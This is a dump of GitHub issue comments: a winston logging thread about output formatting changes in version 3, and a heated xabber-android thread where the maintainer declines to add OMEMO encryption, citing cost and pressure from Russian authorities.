winston/winstonjs/1377/335193249,1377,"  Please tell us about your environment   version? [ ]  [x]      outputs v10.4.1 Operating System? macOS High Sierra v10.13.5 Language? ES6  What is the problem?  I've followed the [upgrade to 3.0]( doc, and when I was done, my logs were broken.  V2 supported multiple arguments to log functions, and using common format options, pretty printed Objects/Arrays/Errors nicely.  So these logs worked in V2    &lt;img width=""415"" alt=""screen shot 2018-06-24 at 18 51 16"" src="" width=""499"" alt=""screen shot 2018-06-24 at 18 52 47"" src="" width=""1083"" alt=""screen shot 2018-06-24 at 18 51 47"" src="" in V3, multiple arguments are no longer supported, only  is supported and only as an Object. Plus the equivalent formatters do not yield the same result.    &lt;img width=""551"" alt=""screen shot 2018-06-24 at 19 27 33"" src="" if I add the  formatter, it's still not the same  &lt;img width=""817"" alt=""screen shot 2018-06-24 at 19 28 02"" src="" What do you expect to happen instead?    The migration doc should mention this fundamental change in behavior and how to resolve it Multiple arguments are treated differently Objects as  are not pretty printed Error Object is ignored (I saw there's an open issue for that) Formatters order matters   I think Winston should support the multiple arguments notation, as it is a very common usage of  and really is much easier to use when you need to log a string and then an Object, etc. (specifically when using the Console transport). The new formatters should yield the previous behavior when using the same setup    ",,False
winston/winstonjs/1377/399971768,1377,plus one The documentation is a bit superficial regarding  and the provided examples such as this one do not result in the expected output. ,,False
winston/winstonjs/1377/399997493,1377,PR would be welcome to update that example @friend. Will take a look at this in depth and see what we can do to make the transition easier. ,,False
winston/winstonjs/1377/399997894,1377,"Also @friend – winston does support the multiple argument notation, it's simply not enabled by default because it is a performance hit and as such opt-in. Use . ",,False
winston/winstonjs/1377/399999465,1377,@friend I can gladly post a PR but currently I'm unable to understand how to obtain the standard notation. I tried adding  I just get a weird message like the ones shown by @friend. ,,False
winston/winstonjs/1377/400002365,1377,I was making the same comments (objects/arrays) aren't formatting the same in the Gitter chatroom.  Seems that the previous options.meta isn't treated the same way.  Would be great to understand the differences and how to fix moving forward. ,,False
winston/winstonjs/1377/400662072,1377,"plus one After maybe 2 hours of trying to obtain the same logging format in V3 as in the previous version, I have to say I have to downgrade. I like the custom formatter and format.combine and everything, but either  coloring doesn't work simple format output doesn't work (no JSON) printing out objects (JSON) doesn't work - I don't see any reason why use custom formater with JSON.stringify or combination of the above  I just want logger.error(""error""), logger.info(object), logger.info(array) and no hustle. ",,False
winston/winstonjs/1377/400665179,1377,All of those features work. If you'd like to share a code sample along with your shade that would be much more constructive. ,,False
xabber-android/redsolution/540/105175969,540,The offspring of this GSOC XSF projects is OMEMO. An axolotl and PEP based open standard for end-to-end encryption. Would be great to see support for it in Xabber. ProtoXEP  info ,,False
xabber-android/redsolution/540/147160733,540,"Finally, security has arrived in IM without compromise. Please add this protocol! I will switch back from Conversations when it comes. ",,False
xabber-android/redsolution/540/273843024,540,"I'm working on an OMEMO Smack module as part of my bachelors thesis, so Xabber might use this in the future. ",,False
xabber-android/redsolution/540/274489082,540,"yes, please support OMEMO in xabber. ",,False
xabber-android/redsolution/540/283202131,540,"Thanks for all the fish, but the addition of this fish would be more better. ",,False
xabber-android/redsolution/540/283598612,540,I'm considering to implement OMEMO in Xabber using smack-omemo and smack-omemo-signal. How can I get further in touch with you? ,,False
xabber-android/redsolution/540/334990060,540,"Looks like smack-omemo has been implemented, any progress on it in Xabber? ",,False
xabber-android/redsolution/540/334990411,540,"We have some other more immediate plans. We have 100% confirmation that at least 80-90% of Russian Xabber users use it for buying drugs. And since our crowdfunding campaign goes rather slow,we... Let's say, not too interested into stretching ourselves and give one more encryption method for this cathegory of users. In fact, we are considering removing Xabber from Russian play store at all,we have some very unwanted attention from authorities because of OTR, but to add yet more to it... No. Definitely not now. If patreon campaign will reach certain milestones,maybe. ",,False
xabber-android/redsolution/540/334991970,540,Can you explain how unwanted attention by authorities is affected by crowdfunding efforts? ,,False
xabber-android/redsolution/540/334993018,540,"@friend why do you provide your own Jabber service, then? If you don't have a central server like xabber.org, it would probably be easier to tell the authorities that you're not the ""information disseminator"" (or how does ""организатор распространения информации"" actually translate to English). ",,False
xabber-android/redsolution/540/334993613,540,"Not good. Time to setup a warrant canary, is not it? Also with this background the crowdfunding campaign will certainly not raise more money. If we have to fear interference of some authorities. Also, you hopefully know that this argumentation is definitively crap. And unless you track your users (which I don't think so) you cannot know what your users are doing with your messenger. So where did you got this number? ",,False
xabber-android/redsolution/540/334995574,540,"@friend that's easy. On one hand we have some difficulties with authorities who vaguely threat they can destroy my business in an instant (it's very easy in russia. police just storms the office, takes away all computers, returns it after 3 years, if ever, end of story). On the other we have an audience of users who constantly moan of a feature I don't personally need at all, and pay me nothing. If we put these two together, a clear solution is to screw Russian audience, I don't really care what client they will use. @friend this argumentation is based on facts. Over the years we have seen just so many help requests on our email support in so many languages, requests in Russian stands out in it by some very unusual metrics rarely present in other groups - phony names and inadequate requests, users clearly have no idea how XMPP works. Plus we've recently launched our own XMPP service that requires users to provide name and surname. And guess what, out of several thousands registrations Russian locale names and surnames once again look very... different from Germans. So, since I have zero sympathy for junkies, and Russian audience is proving to be worthless to me, while giving me some headache. So, I think we'll be removing Xabber from Russian Google Play. And once again on OMEMO so far I'm the only one who paid for development of Xabber, I had some spare money to create an app that I like. I like current Xabber, and I have some plans to redesign it to make it even better looking. I have some plans to create several protocols to make XMPP work much better on mobile devices. I have some plans to bring Xabber for Web to many desktop platforms with Electron framework. I have some plans for all these versions of Xabber to work seamlessly with one another, so you can pick up your conversation on phone after chatting on desktop. That what I want and what I'm paying developers for. What I don't want is OMEMO, it's worthless to me. And since I'm a bit out of spare money, I have to make Xabber a viable source of income, I have some Ideas how to do that, and OMEMO does not play into any of these ideas. If some of you want this feature badly, pay me a for development of it (we charge $3500 per developer man/month). If you are not willing - well, sorry, we serve only customers, not freeriders. I actually don't understand this desire for encryption. Some ejabberd developer recently said in email group that XMPP community is affected by severe crypto-cancer, and I fully agree with him. For most uses, OTR or OMEMO just gives user an illusion of safety, not really meaningful increase in it. If you want your messages to be safe, you can just run your own server, that's easy and rather cheap. Just be wary of certificate errors. TL,DR OMEMO is for junkies and crypto-nerds who pay us nothing, get lost, or pay. ",,False
xabber-android/redsolution/540/334997114,540,It's sad to hear that you have problems with the authorities. Don't let them oppress you if you didn't do anything wrong. On the other hand there are normal people - who don't use this to deal drugs - who just want their privacy to be protected and also have some convenience. That what's OMEMO is all about. ,,False
xabber-android/redsolution/540/334997840,540,"@friend convenience...  For me, convenience is using multiple devices, syncing history between them, making in searchable, etc. You can have all of that by running own server, that's not too hard or costly. And with OMEMO, once chat is encrypted, you cant' search it, you can't really sync it, etc. - and if you somehow can, then it means that you have an illusion of safety, not better safety. My endgoal for Xabber, is to make XMPP messaging as ubiquitous for instant messaging as email. But to fight Telegram or Whatsapp we need to bring a knife to a knife fight, and OMEMO is hardly that knife. I don't really mind it's addition to Xabber, but, well, someone better pay for it. Btw, OTR was added on precisely same terms - some guy from Moscow volunteered and paid for our initial expenses developing OTR encryption back in 2013 (or 2012? don't remember... ) I prefer to receive payments with bitcoin. Oh, if you ask me, integration to send bitcoin is more essential for Xabber than OMEMO. ",,False
xabber-android/redsolution/540/334998390,540,How do you come to this conclusion? With OMEMO and Message Carbons (XEP-0280) I can have encrypted chats synced to all my devices and on all devices I can search the chat history just fine. ,,False
xabber-android/redsolution/540/334999116,540,"@friend login from new device and try searching your history like you do on telegram. Client-side search is fail. Anyway, I don't mind you doing a PR with this functionality, we'll test it and accept it in project if it's done well. I don't get it why you all want me to work for free so you can have convenient OMEMO in your device. I don't need or want OMEMO, so I have very little incentive to pay for development of OMEMO. Isn't it fair to be paid by those who actually want it? Anyway you all have free alternatives. Also, message carbons is NOT sufficient to fully sync messages. You at least need to use an archive on server to catch up with those messages sent while you were offline (offline messages will not do if you had 2 devices offline- only one of them will receive offline messages, other will have nothing without archive). ",,False
xabber-android/redsolution/540/334999240,540,Nothing wrong with that. And I don't want to force your to do anything. Just want to challenge your assumption about OMEMO encryption. ,,False
xabber-android/redsolution/540/334999770,540,"@friend my assumption is that heavy lifting should be done by server (client-centristic mentality has already cost XMPP it's potential place as a mainstream messaging protocol). If server does not know contents of messages, it can't search it. Also, if you store ALL you history on device, instead of small portion of recent messages, well, if your device gets seized, guess what happens? all your history belongs to them, so much for 'security'. Better way would be having a trusted server and having just an immediate portion of your history on device, while accessing more distant history with PIN checked by server. But with this crypto-cancer in community it'll hardly happen anytime soon. (I'd order implementation of server-side search in Xabber in no time, if I had any server available that would support such feature) ",,False
xabber-android/redsolution/540/335019593,540,"Please keep to the facts  Your link about ""crypto cancer"" is about server-to-server SSL connections as far as I see. Also what drives users away according to the comment is spam. (That was taken out of context. Read ""Spam is a bigger problem that missing s2s encryption."" Actually as far as I understand the user replying meant In the XMPP community there is crypto cancer, because many people still do not want to use s2s encrypted messages.) So if you quote stuff, please make sure it fits into what you actually want to prove and don't twist the facts. As far as it goes the topic was not about e2e crypto at all. I feel like you have no (correct) information about OMEMO/how OMEMO works. In short OMEMO is far better than OTR. See this page.. TL;DR In contrast to OTR it actually allows you to use multiple devices, search your messages, send messages when the other is not online, etc. The thread model you describe in the last comment is solved very simple Encrypt your messages locally (i.e. full disk encryption). When the messages are stored on the server and someone gets your device, they can also just instantly download all the old messages. Saving (unencrypted) messages on servers only saves space and makes it easier for authorities to scan messages when they size a server. (Because if you use your own server, they could also size your server instead of your local device.)  TL;DR Only encryption helps. (whether it is FDE on the local device, or server or something like OMEMO)  What I agree with is that people can of course support you, if they want to have a good coverage of OMEMO clients and want this feature. Especially as it is not easy to implement. (You certainly need to find a library for it, as otherwise you can do too much wrong in the crypto.) So anyone who wants this feature, here is a BugBounty Xabber – Add support for OMEMO Encyrption Support it or use another client software, which already has OMEMO support. That are your choices. ",,False
xabber-android/redsolution/540/335068173,540,"@friend facts are  crypto-cancer has taken over all XMPP community, especially users who do not program anything themselves, they just want it for no real reason but their paranoia. It's not only about s2s connections, it's about 'let's encrypt everything'. That link is just one example of this. This thread is another. Dozens of frequent requests 'do us OMEMO' in our email is another. We'd do OMEMO if these requests were based on something more than endless moaning client-side search is fail, I tell you once again.  you do not read what I say above. Search for word PIN and read once more. Yes, server should be updated for such security model. But securing data on device is infinitely harder and less reliable than on server  OTR or OMEMO solves only one security problem - if you don't trust your chat provider, because the only real advantage it gives you over unencrypted messaging is that XMPP.org admin can read your messages. If you have your own server, this risk goes away. Yes, it requires some efforts to maintain server, but you want security or illusion of security? Unlocking your device without your consent is much easier than unlocking server. What is particularly hilarious with this XMPP crypto-cancer is that all these folks who email me about how essential is encryption for messaging usually email me via gmail.com TL;DR please, stop trying to convince us to implement OMEMO. We know what it is. We don't want it for now, because we have limited resources that we prefer to put on things we believe more important for Xabber. If you want us to divert resources it direction you want, we have commercial rates for such work. Thank you for your attention and interest in our project. ",,False
xabber-android/redsolution/540/335080649,540,"FWIW, not really unless you you chat only with people who have a account on the same server. Otherwise you don't know at which servers your messages end up. Also thhe argument ""if someone hacks your device, he has complete access to the chat history"" is also true for the server aka ""if someone hacks your server (or one of your chat partners), he has complete access to the chat history"" ",,False
xabber-android/redsolution/540/335091421,540,@friend prime audience for the use of end to end encryption (drug addicts) are far more likely to have their device seized than their server. ,,False
xabber-android/redsolution/540/335099500,540,"Thank you for the clear words. Then I know now that I don't have to wait for Xabber with OMEMO anymore and stay with Conversations, although I don't want to buy drugs at all. Consistently, you might want to take OTR out so that Xabber becomes useless for junkies and the authorities leave you alone. OTR is certainly also one of the functions for junkies that you don't need personally. After that, you could take care of a nice surface in peace. ",,False
xabber-android/redsolution/540/335107474,540,"@friend you know, every single junkie user I talked to said exactly the same. -D We certainly won't remove OTR functionality from Xabber - most likely we'll simply pull down  Xabber with OTR from Russian Google Play store. Our authorities are luckily not too interested in foreign drug dealers and addicts. Then we'll possibly provide a ""Xabber for Business"" version without encryption for our normal Russian users (all seventeen of them) And I'm not saying we won't ever support OMEMO - it's just not our first, second or third priority. Have you seen Xabber for Web? Creating a multi-platform chat app that works extremely well  for federated chat, everywhere - that's what we are truly aimed at. ",,False
xabber-android/redsolution/540/335110489,540,"The way you talk about your users makes me feel really sorry for you ( It feels like Xabber is really not the app I'd recommend to privacy aware users anymore. Neither because its encryption, nor the will of the devs to protect their users. I respect that decision though and will stop bothering you anymore ) ",,False
xabber-android/redsolution/540/335113350,540,"From xabber.com You should probably change that to reflect you actual ""priorities"". ",,False
xabber-android/redsolution/540/335113767,540,"@friend the only privacy-aware users we've encountered so far are junkies, drug dealers and encryption nerds like folks in this thread.  Nerds comprise maybe 1 or 2% of users who are interested in data protection. Any yes, I think you would talk even worse of our users if you did get to read contents of our inbox on support email. And I'm actually offended by your insinuations about our 'will of the devs to protect their users'. Luckily for us, we DON'T have any user data, and we clearly won't submit to installing backdoors or stuff to our app. However you CLEARLY don't understand dangers of such stance in Russia. Linkedin is already blocked in Russia because it refused authorities access to user's data. Facebook will be blocked too if it won't submit. Viber has submitted too, so... it's either you are working in Russia and providing info or being blocked. Company like mine can be instantly seized by armed police, computers taken away, property sealed, company instantly bankrupted, I get jailed. Courts and laws don't really function in Russia, I might very well be sentenced for 'organizing a darknet criminal network to sell drugs and weapons', all because some crypto-nerds want OMEMO. So we simply plan to put our users (even junkies, yes) out of danger to their data being compromised by pulling our app from our country play store. (and to think I've personally spent more than $150k to listen to this.... how cool is that?) ",,False
xabber-android/redsolution/540/335122901,540,@friend I pity your situation. Maybe just close the ticket and let it rest. The issuer doesn't seem to be interested in this any more. Other security aware users will probably choose different software. ,,False
xabber-android/redsolution/540/335124465,540,"@friend Sorry, I did not intend to offend you. I can imagine that your situation in russia is not the best. I just dislike the way you talk about your users and the fact, that you throw all people interested in crypto into one category labelled ""drug addicts"". This is exactly that kind of rhetoric, which might one day outlaw cryptography completely (""who has nothing to hide...""). Anyways I wish you the best for your future and the future of the project ) ",,False
xabber-android/redsolution/540/335132502,540,"@friend no, this ticket might as well remain. Just not top priority for us. We'll probably do it eventually, maybe even this year. Current priority - redesign (Xabber is going to look GREAT), proper push notifications support since ejabbed now supports it, THEN I'll possibly ask our devs to do OMEMO if I won't have more immediate ideas. @friend you too wouldn't like our users if you talked to them. Luckily for us, so far Xabber is popular only within Russian criminal underground, if we measure by inadequate help requests that are 85% in Russian (if you read them often, you can see person interested in drugs at a glance). If you read carefully, I was always referring to our Russian audience, not all encryption users. Well, some folks here who constantly push us to 'do us OMEMO now' irritate me a bit, but that's ok. So the rest of the world will be as fine as it was before, no changes will be made. I'd consider moving Xabber to another jurisdiction, but that's a matter of money. Maybe even transferring rights to FSF, though I don't know if they are interested in this. ",,False
xabber-android/redsolution/540/335134550,540,"Don't want to get too much offtopic, but does the FSF host Android applications? I only know of IceCat mobile... Excited to see the new Xabber design ) ",,False
xabber-android/redsolution/540/335174668,540,"Good idea. 👍 But I see it like @friend does. I think all users, who commented on this issue here are interested in having a private mesenger. I doubt that anyone here is a drug dealer. Your equation ""cares for privacy = drug dealer"" does not make sense, even if the authorities maybe urge you to think that. And as said, your statistics are not good (help requests are not a good sign to measure your whole user base; many people may not need any help) and you take numbers out of nowhere. I see that your situation is difficult and developing such a secure messenger is… well… maybe even dangerous. I seriously feel sorry for that. However, that does not change the fact that you – as a dev of an important FLOSS app – care for the privacy/security of your users, who you don't know (for the same reason; don't think you know them because some dumba**es mail you). You can say, we cannot do this for legal reasons, we need to move the company (etc.) to another country or similar things. That's okay and we all understand that, but your inner motivation is questionable from your statements you do here. And throwing false facts into the discussion does not help either… ",,False
xabber-android/redsolution/540/335213685,540," Thank you @friend for your open words and the time to answer here all these questions! I really appreciate that (Even if not anybody agrees with you on certain statements.)  Summary of that thread to avoid further confusion   Will there be soon or ever OTR support in Xabber by the core devs? Unsure. Why? Because it's not very high on their priority list. They focus on features they personally need/use or other things they are more interessted in. Nothing wrong with that imho, especially when their own money is involved. Is there a way to give it more priority? Yes!  stated, they are also happy to receive PRs for that. ",,False
xabber-android/redsolution/540/335218189,540,Everybody who wants to get started with that might want to take a look at this blogpost ) ,,False
xabber-android/redsolution/540/335401248,540,"@friend Unsure. You mean OMEMO, right? OTR was in Xabber for ages ",,False
xabber-android/redsolution/540/335595010,540,Talking about OTR (Why) Does it make a difference to you whether drug dealers encrypt with OTR or OMEMO? That does hardly matter… (So consequently you'd either have to remove OTR or may add OMEMO.) ,,False
xabber-android/redsolution/540/335712827,540,"We don't plan to remove OTR until we have something to replace it with. We might remove Xabber from russian users, so hopefully they'll switch to some other app and feds will stop being interested in us. And OMEMO just requires some work that we aren't really willing to do at this moment, since it'll likely just increase pressure on us. ",,False
xabber-android/redsolution/540/335768679,540,Yes. I mean OMEMO. fixed. Thx. ,,False
xabber-android/redsolution/540/336622211,540,"Amen. There is far too much demanding with no ""put your money where your mouth is"" [American idiom]. ",,False
xabber-android/redsolution/540/343692437,540,"Encryption is not a crime. If russian users or any terrorists group or nazis or any bad people uses whatsapp, no body can say that whatsapp is evil. we have a bigger issue than adding one more encryption protocol @friend ",,False
xabber-android/redsolution/540/343728995,540,"Oh, not this again. Xabber is not evil, and any app is not evil, but you know who is? FSB! (formerly known as KGB) To be clear, here is a breakdown of what we have from having OTR in Xabber  tons of help support requests from idiots who are clearly junkies and know NOTHING about XMPP, just install it because their supplier told them so and are pissed off because it's not as simple as Whatsapp visits from FSB operatives who coerce us into installing backdoors into Xabber so they can read chats that are supposed to be secure threads like this on GitHub zero revenue  Do you have any understanding how easy it is to get jailed in Russia if you cross FSB? So, please, go preach this 'encryption is not a crime' to someone else. We know it's not a crime, but in current situation our options are a bit limited  put backdoors into Xabber refuse to put backdoors into Xabber (and quite possibly get jailed, for, like, drug trade) remove Xabber from russian app store  Of these three, if things will get really heated, the only viable option for us is last one. ",,False
xabber-android/redsolution/540/343731956,540,"That would maybe be the easiest option. And clearly better than adding backdoors and getting jailed or so. I mean those who need it, could still install it from F-Droid or compile it by themselves. I wonder anyway why drug dealers would install that app. I mean using WhatsApp would maybe not be the worst choice for their threat model. ",,False
xabber-android/redsolution/540/343735201,540,"@friend whatsapp exposes phone numbers, and is also... kinda not really trusted among this group of users. Corporation behind whatsapp might very well start responding to requests to disclose user information including IP addresses and such. XMPP working over TOR has this threat reduced to nothing. ",,False
xabber-android/redsolution/540/364865400,540,"@friend yeah, elite. Maybe you'll volunteer to answer support requests from our russian users? ",,False
xabber-android/redsolution/540/378250815,540,You can achieve this locally using a rachet. Just encrypt messages using a rachet (new derived key every message) and only store the key for last X messages. Then have the original key to the first message be encrypted using PIN and a slow key derivation function (lots of iterations). ,,False
xabber-android/redsolution/540/394093213,540,You need to do encryption. It doesn't violate and laws. Its should be/must have. OMEMO is good technology and should be implemented. ,,False
xabber-android/redsolution/540/394101392,540,"@friend so many people here telling us what we should do. Unfortunately, they tend to forget to back their instructions with payment. ",,False
xabber-android/redsolution/540/394102167,540,Well… if you mean that serious (which I doubt wink ) you could setup a bountysource for this issue and collect money for it. I doubt though… that this really solves the initial legal problem that makes this issue staling. ,,False
xabber-android/redsolution/540/394154401,540,"@friend I'm very serious. When I tell Xabber developers what they should do today, I back my instructions with payment. I think it's fair that anyone who wants to give them instructions should too back it with payment. All by himself, owning responsibility for what he wants us to do. Why should someone on bountysource pay for what @friend wishes? ",,False
xabber-android/redsolution/540/394155584,540,"Bountysource does not work that way. Here is how it works  Anyone who wants this issue solved, pays in money there. When this issue is solved and you accept a PR (or implement it yourself) you can get the money from there.  So if you want to do that, just signup there, claim ownership over the account there and add a prominent link to the top of this issue. ",,False
xabber-android/redsolution/540/394157701,540,"@friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done. ",,False
xabber-android/redsolution/540/394158075,540,"Not payment. I must ask my daugther first, she has made my xabber account, because I'm ill. ",,False
xabber-android/redsolution/540/394158343,540,"Can you restore my account? Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von rugk notifications@friend.com Datum 03.06.18  1328  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc Subscribed subscribed@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540) Why should someone on bountysource pay for what @friend wishes? Bountysource does not work that way. Here is how it works Anyone who wants this issue solved, pays in money there. When this issue is solved and you accept a PR (or implement it yourself) you can get the money from there. So if you want to do that, just signup there, claim ownership over the account there and add a prominent link to the top of this issue. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 \u003e Why should someone on bountysource pay for what @friend wishes?\r\n\r\nBountysource does not work that way. Here is how it works\r\n1. Anyone who wants this issue solved, pays in money there.\r\n2. When this issue is solved and you accept a PR (or implement it yourself) you can get the money from there.\r\n\r\nSo if you want to do that, just signup there, claim ownership over the account there and add a prominent link to the top of this issue.""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""rugk"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" } ",,False
xabber-android/redsolution/540/394158968,540,@friend see what you've done? ,,False
xabber-android/redsolution/540/394158758,540," Do not understand your emails. Please wait one week till my daughter come back, she'll say me, what you write. You have no help in German? Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Andrew Nenakhov notifications@friend.com Datum 03.06.18  1407  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc Subscribed subscribed@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  @friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 @friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done.""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Andrew Nenakhov"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" } ",,False
xabber-android/redsolution/540/394159122,540,@friend Dies ist nicht der richtige Ort für solche Supportanfragen ) This is not the right place for this kind of questions. ,,False
xabber-android/redsolution/540/394160145,540,"Generally speaking, this is a place to discuss developer problems, specifically implementing a new feature in this case. You do have a user problem. Please seek help from the Xabber Support Team, not on Github. Unfortunately you are kind of making it hard to follow the original topic of this discussion with your request. @friend Can you later delete this part of the discussion? ",,False
xabber-android/redsolution/540/394159826,540,"I speak about my xabber account, and you write about prices.I need xabber help to restore my account. I have cancel my xabber account by mistake.Thank you for your help, but you arenot right here.Heide Hemmelrath Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Andrew Nenakhov notifications@friend.com Datum 03.06.18  1407  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc Subscribed subscribed@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  @friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 @friend why should I care how Bountysource works? The one who wants issue solved is not me, but @friend . So HE can negotiate the price with us, raise money with whatever means he has, pay us and get the job done.""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Andrew Nenakhov"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" } ",,False
xabber-android/redsolution/540/394160176,540,"@friend if you need our help with Xabber account, please email support@friend.com  This thread on Github is not for tech support. It's a place where crytonerds and cryptojerks try to coerce us to develop new functionality for our app so they could feel really safe from surveillance ",,False
xabber-android/redsolution/540/394160238,540,"@friend don't wanna delete it, it's the most amusing part of this thread! ",,False
xabber-android/redsolution/540/394160655,540,@friend I'm sure your daughter can help you ) Please show her our discussion afterwards ;) ,,False
xabber-android/redsolution/540/394160338,540,"I'm waiting for my daughter, she say me, what I can doWhy I can't restore my xabber account and where? I don't find it, that is the question. I have cancel it by mistake.That's all.Heide Hemmelrath Xabber name ( heideline) Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Paul Schaub notifications@friend.com Datum 03.06.18  1431  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc heideline hm.hemmelrath@friend.com, Mention mention@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  @friend Dies ist nicht der richtige Ort für solche Supportanfragen ) This is not the right place for this kind of questions. — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 @friend Dies ist nicht der richtige Ort für solche Supportanfragen )\r\nThis is not the right place for this kind of questions.""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Paul Schaub"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 